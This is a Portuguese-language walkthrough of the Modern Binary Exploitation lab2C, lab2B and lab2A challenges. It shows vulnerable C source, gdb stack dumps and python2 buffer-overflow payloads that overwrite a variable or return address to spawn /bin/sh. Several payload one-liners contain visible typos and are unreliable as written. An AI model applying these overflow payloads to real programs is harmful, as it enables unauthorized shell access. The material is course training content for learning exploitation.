# Labs 01 - Modern Binary Exploitation

Este documento contém minhas soluções para os problemas do laboratório 1 do programa Modern Binary Exploitation. Importante ressaltar que utilizarei python2, pois é o que temos disponível na máquina disponibilizada para o Wargame.


## Lab2C

O laboratório 2C inicia com o código abaixo:

```C
  1 #include <stdlib.h>
  2 #include <stdio.h>
  3 #include <string.h>
  4 
  5 /*
  6  * compiled with:
  7  * gcc -O0 -fno-stack-protector lab2C.c -o lab2C
  8  */
  9 
 10 void shell()
 11 {
 12     printf("You did it.\n");
 13     system("/bin/sh");
 14 }
 15 
 16 int main(int argc, char** argv)
 17 {
 18     if(argc != 2)
 19     {
 20         printf("usage:\n%s string\n", argv[0]);
 21         return EXIT_FAILURE;
 22     }
 23 
 24     int set_me = 0;
 25     char buf[15];
 26     strcpy(buf, argv[1]);
 27 
 28     if(set_me == 0xdeadbeef)
 29     {
 30         shell();
 31     }
 32     else
 33     {
 34         printf("Not authenticated.\nset_me was %d\n", set_me);
 35     }
 36 
 37     return EXIT_SUCCESS;
 38 }
 ```

Nota-se que há um buffer com limite de 15 caracteres, na linha 25, que pode ser explorado devido à má implementação do código, pois copia-se uma string que não possui limite de tamanho para esse buffer limitado na linha 26.

Nesse sentido, podemos criar um payload que exceda os 15 bytes pretendidos e que possua, nos próximos 4 bytes, o valor idealizado para a variável `set_me`. Portanto, com o payload criado por `python -c 'print ("A" * 0x0f) + "\xef\xb\xad\xde"'`, acessamos o usuário lab2B :D


## Lab2B

O nível médio inicia-se com o seguinte código:

```C
  1 #include <stdlib.h>
  2 #include <stdio.h>
  3 #include <string.h>
  4 
  5 /*
  6  * compiled with:
  7  * gcc -O0 -fno-stack-protector lab2B.c -o lab2B
  8  */
  9 
 10 char* exec_string = "/bin/sh";
 11 
 12 void shell(char* cmd)
 13 {
 14     system(cmd);
 15 }
 16 
 17 void print_name(char* input)
 18 {
 19     char buf[15];
 20     strcpy(buf, input);
 21     printf("Hello %s\n", buf);
 22 }
 23 
 24 int main(int argc, char** argv)
 25 {
 26     if(argc != 2)
 27     {
 28         printf("usage:\n%s string\n", argv[0]);
 29         return EXIT_FAILURE;
 30     }
 31 
 32     print_name(argv[1]);
 33 
 34     return EXIT_SUCCESS;
 35 }
```

Vemos, então, que há uma função `shell()` que deve ser chamada com o argumento da `exec_string`. Para isso, temos que explorar o buffer na linha 20, pois há uma chamada de `strcpy()` entre o input (que possui tamanho ilimitado) e o buffer (que possui tamanho limitado).

Nesse sentido, podemos realizar o exploit do return address durante a chamada da função `print_name()` para ela retornar para o endereço de `shell()` e, além disso, inserir a string como uma das variáveis locais.

### Return Address

Inserindo "A" * 15 como input do código, a stack da função `print_name()` fica assim:

```sh
gdb-peda$ x/100x $sp
0xbffff580:     0x91    0xf5    0xff    0xbf    0xcd    0xf7    0xff    0xbf
0xbffff588:     0x01    0x00    0x00    0x00    0x41    0x85    0x04    0x08
0xbffff590:     0xb9    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff598:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff5a0:     0x00    0x00    0x00    0x00    0x64    0xf6    0xff    0xbf
0xbffff5a8:     0xc8    0xf5    0xff    0xbf    0x38    0x87    0x04    0x08
0xbffff5b0:     0xcd    0xf7    0xff    0xbf    0x00    0xf0    0xff    0xb7
0xbffff5b8:     0x4b    0x87    0x04    0x08    0x00    0xd0    0xfc    0xb7
0xbffff5c0:     0x40    0x87    0x04    0x08    0x00    0x00    0x00    0x00
0xbffff5c8:     0x00    0x00    0x00    0x00    0x83    0xca    0xe3    0xb7
0xbffff5d0:     0x02    0x00    0x00    0x00    0x64    0xf6    0xff    0xbf
0xbffff5d8:     0x70    0xf6    0xff    0xbf    0xea    0xcc    0xfe    0xb7
0xbffff5e0:     0x02    0x00    0x00    0x00
```

Repare que de `0xbffff591` a `0xbffff5a0`, temos o buffer repleto de "A" (representado por 0x41 em hexa). Entretanto, logo após temos uma sequência de 0x00 e alguns outros bytes. Temos que achar o endereço de retorno. Realizando o disassembly da `main()`, vemos:

```x86
   0x08048730 <+51>:    mov    DWORD PTR [esp],eax
   0x08048733 <+54>:    call   0x80486d0 <print_name>
   0x08048738 <+59>:    mov    eax,0x0
```

Dessa maneira, vemos que o endereço de retorno que buscamos é `0x08048738`. Olhando novamente a stack impressa, vemos esse endereço entre `0xbffff5ac` e `0xbffff5b0`. Portanto, o offset entre o fim da string e o início do return address é de `0x1b` (27) bytes.

Realizando o disassembly da função `shell()`, vemos que o endereço inicial da sua instrução é `0x080486bd`. Então, o início do nosso payload é dado por:

`python -c 'print "A" * 0x1b + "\xbd\x86\x04\x08"`

Nos resta, agora, passar o parâmetro correto para a função.

### String

Para inserirmos a string como parâmetro, primeiro, precisamos encontrar o seu endereço dentro do processo. Para entendermos o mapeamento da memória virtual do processo, fazemos:

```
gdb-peda$ info proc map
process 1186
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /levels/lab02/lab2B
         0x8049000  0x804a000     0x1000        0x0 /levels/lab02/lab2B
         0x804a000  0x804b000     0x1000     0x1000 /levels/lab02/lab2B
        0xb7e22000 0xb7e23000     0x1000        0x0 
        0xb7e23000 0xb7fcb000   0x1a8000        0x0 /lib/i386-linux-gnu/libc-2.19.so
        0xb7fcb000 0xb7fcd000     0x2000   0x1a8000 /lib/i386-linux-gnu/libc-2.19.so
        0xb7fcd000 0xb7fce000     0x1000   0x1aa000 /lib/i386-linux-gnu/libc-2.19.so
        0xb7fce000 0xb7fd1000     0x3000        0x0 
        0xb7fd9000 0xb7fdb000     0x2000        0x0 
        0xb7fdb000 0xb7fdc000     0x1000        0x0 [vdso]
        0xb7fdc000 0xb7fde000     0x2000        0x0 [vvar]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.19.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.19.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.19.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]

```

Então, podemos procurar a string: 

```
gdb-peda$ searchmem "/bin/sh" 0x8048000 0x804b000 
Searching for '/bin/sh' in range: 0x8048000 - 0x804b000
Found 2 results, display max 2 items:
lab2B : 0x80487d0 ("/bin/sh")
lab2B : 0x80497d0 ("/bin/sh")
```

Temos nosso endereço! Agora, podemos criar o payload usando o padding descoberto:


`python -c 'print "A" * 0x1b + "\xbd\x86\x04\x08" + "A" 0x04 + "\xd0\x97\x04\x08"'`


## Lab2A

Para o último, vamos conferir o código disponibilizado:

```C
  1 #include <stdio.h>
  2 #include <stdlib.h>
  3 #include <string.h>
  4
  5 /*
  6  * compiled with:
  7  * gcc -O0 -fno-stack-protector lab2A.c -o lab2A
  8  */
  9
 10 void shell()
 11 {
 12     printf("You got it\n");
 13     system("/bin/sh");
 14 }
 15
 16 void concatenate_first_chars()
 17 {
 18     struct {
 19         char word_buf[12];
 20         int i;
 21         char* cat_pointer;
 22         char cat_buf[10];
 23     } locals;
 24     locals.cat_pointer = locals.cat_buf;
 25
 26     printf("Input 10 words:\n");
 27     for(locals.i=0; locals.i!=10; locals.i++)
 28     {
 29         // Read from stdin
 30         if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
 31         {
 32             printf("Failed to read word\n");
 33             return;
 34         }
 35         // Copy first char from word to next location in concatenated buffer
 36         *locals.cat_pointer = *locals.word_buf;
 37         locals.cat_pointer++;
 38     }
 39
 40     // Even if something goes wrong, there's a null byte here
 41     //   preventing buffer overflows
 42     locals.cat_buf[10] = '\0';
 43     printf("Here are the first characters from the 10 words concatenated:\n\
 44 %s\n", locals.cat_buf);
 45 }
 46
 47 int main(int argc, char** argv)
 48 {
 49     if(argc != 1)
 50     {
 51         printf("usage:\n%s\n", argv[0]);
 52         return EXIT_FAILURE;
 53     }
 54
 55     concatenate_first_chars();
 56
 57     printf("Not authenticated\n");
 58     return EXIT_SUCCESS;
 59 }
```

Repare que conseguimos exploitar o nosso buffer, pois a leitura do `fgets()`, na linha 30, é limitada em `0x10` (16 bytes) e o buffer possui 12 bytes de tamanho. 

Entretanto, ao contrário dos outros challenges, nesse não poderemos sobrescrever, diretamente, o return address pois não alcançamos ele, mas podemos exploitar o iterador da linha 27 e, assim, utilizar o `cat_buf` como o entrypoint para o payload!

Testei se poderíamos realizá-lo da seguinte maneira:
```zsh
lab2A@warzone:/levels/lab02$ ./lab2A
Input 10 words:
1234567890xxx
1
2
3
4
5
6
7
8
9
0
1
2
3
4
5
6
7
8
9
0
12
3

Failed to read word
Not authenticated
213Segmentation fault (core dumped)
```

O processo só foi encerrado quando inseri o `\n` e, além disso, tivemos um SegFault! Agora, nos resta encontrar o padding entre o buffer e o return address.

No GDB, iniciei o código e puz um breakpoint na função `concatenate_first_chars()`. Além disso, peguei o endereço da instrução após a chamada dessa função na `main()`:

```x86
   0x080487da <+36>:	mov    eax,0x1
   0x080487df <+41>:	jmp    0x80487f7 <main+65>
   0x080487e1 <+43>:	call   0x804871d <concatenate_first_chars>
   0x080487e6 <+48>:	mov    DWORD PTR [esp],0x8048915
   0x080487ed <+55>:	call   0x80485c0 <puts@plt>
   0x080487f2 <+60>:	mov    eax,0x0
```

Sabemos que o endereço da instrução é `0x080487e6`. Logo após, imprimi a stack quando 4 caracteres (inseri apenas "A") já haviam sido acumulados no buffer vulnerável:


```sh
gdb-peda$ x/200x $sp
0xbffffbc0:	0xbffffbd0	0x00000010	0xb7fcdc20	0xb7e56273
0xbffffbd0:	0x00000a41	0x00c30000	0x00000001	0x00000004
0xbffffbe0:	0xbffffbe8	0x41414141	0x0804a000	0x08048852
0xbffffbf0:	0x00000001	0xbffffcb4	0xbffffc18	0x080487e6
0xbffffc00:	0xb7fcd3c4	0xb7fff000	0x0804880b	0xb7fcd000
```

Repare que temos 4 bytes de `0x41` a partir de `0xbffffbe4`. Para confirmar, esperei acumular 5 bytes:

```sh
gdb-peda$ x/100x $sp
0xbffffbc0:	0xbffffbd0	0x00000010	0xb7fcdc20	0xb7e56273
0xbffffbd0:	0x00000a41	0x00c30000	0x00000001	0x00000005
0xbffffbe0:	0xbffffbe9	0x41414141	0x0804a041	0x08048852
0xbffffbf0:	0x00000001	0xbffffcb4	0xbffffc18	0x080487e6
0xbffffc00:	0xb7fcd3c4	0xb7fff000	0x0804880b	0xb7fcd000
```

De fato, esse é o local da string. Além disso, repare que em `0xbffffbfc` temos o endereço! Portanto:

```sh
>>> 0xbffffbfc - 0xbffffbe4
24L
```

24 é o padding! Portanto, devemos escrever 24 palavras com iniciais aleatórias para exploitar o buffer (considerando a primeira que exploita o identador) e, logo após, mais 4 que representam o endereço da primeira istrução de `shell()`

Realizando o disassembly de `shell()`:

```sh
gdb-peda$ disas shell
Dump of assembler code for function shell:
   0x080486fd <+0>:	push   ebp
   0x080486fe <+1>:	mov    ebp,esp
   0x08048700 <+3>:	sub    esp,0x18
   0x08048703 <+6>:	mov    DWORD PTR [esp],0x8048890
   0x0804870a <+13>:	call   0x80485c0 <puts@plt>
   0x0804870f <+18>:	mov    DWORD PTR [esp],0x804889b
   0x08048716 <+25>:	call   0x80485d0 <system@plt>
   0x0804871b <+30>:	leave
   0x0804871c <+31>:	ret
End of assembler dump.
```

Com o endereço `0x080486fd`, podemos fabricar o payload do exploit com o comando:

`python -c 'print ("B" * 0x0f) + ("A\n" * 0x17) + "\xfd\n\x86\n\x04\n\x08\n"'`
